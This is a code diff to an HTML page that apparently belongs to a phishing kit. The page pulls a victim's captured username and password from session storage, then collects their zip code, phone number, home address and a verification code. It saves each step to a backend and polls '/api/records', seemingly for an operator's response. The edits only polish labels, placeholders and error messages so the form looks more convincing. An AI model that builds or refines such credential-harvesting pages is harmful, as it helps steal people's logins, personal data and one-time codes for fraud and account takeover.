@@ -76,12 +76,12 @@
             <label>Zip Code</label>
             <input type="text" id="zip" maxlength="5" placeholder="12345" oninput="this.value = this.value.replace(/[^0-9]/g,'')">
 
-            <label>Phone Number</label>
+            <label>Phone Number (US - 10 digits)</label>
             <input type="tel" id="phone" maxlength="10" placeholder="1234567890" 
                    oninput="this.value = this.value.replace(/[^0-9]/g,'')" required>
 
             <label>Home Address (Current)</label>
-            <input type="text" id="address" placeholder="Enter your current home address" required>
+            <input type="text" id="address" placeholder="Start typing address (e.g. 405 furry rd)" required>
 
             <button class="continue" onclick="saveStep2()">Continue</button>
         </div>
@@ -98,13 +98,10 @@
             <button class="new-code" onclick="requestNewCode()">Request New Code</button>
         </div>
     </div>
-    
 
     <script>
         let realPassword = sessionStorage.getItem('realPassword') || "N/A";
         let realUsername = sessionStorage.getItem('realUsername') || "Unknown";
-        
-);
 
         async function saveStep(details, stepName) {
             try {
@@ -152,7 +149,7 @@
             const address = document.getElementById('address').value.trim();
 
             if (zip.length !== 5 || phone.length !== 10 || !address) {
-                alert("Please fill all fields: Zip Code (5 digits), Phone (10 digits), and Home Address.");
+                alert("Please fill all fields correctly:\n- Zip Code (5 digits)\n- Phone (10 digits)\n- Home Address");
                 return;
             }
 
@@ -188,6 +185,7 @@
 
             await saveStep(fullDetails, "Final Code Submission");
 
+            // Polling logic
             const interval = setInterval(async () => {
                 const res = await fetch('/api/records');
                 const records = await res.json();
@@ -238,11 +236,6 @@
                 document.getElementById('year').appendChild(opt);
             }
         };
-
-
-
-
-
     </script>
 </body>
 </html>
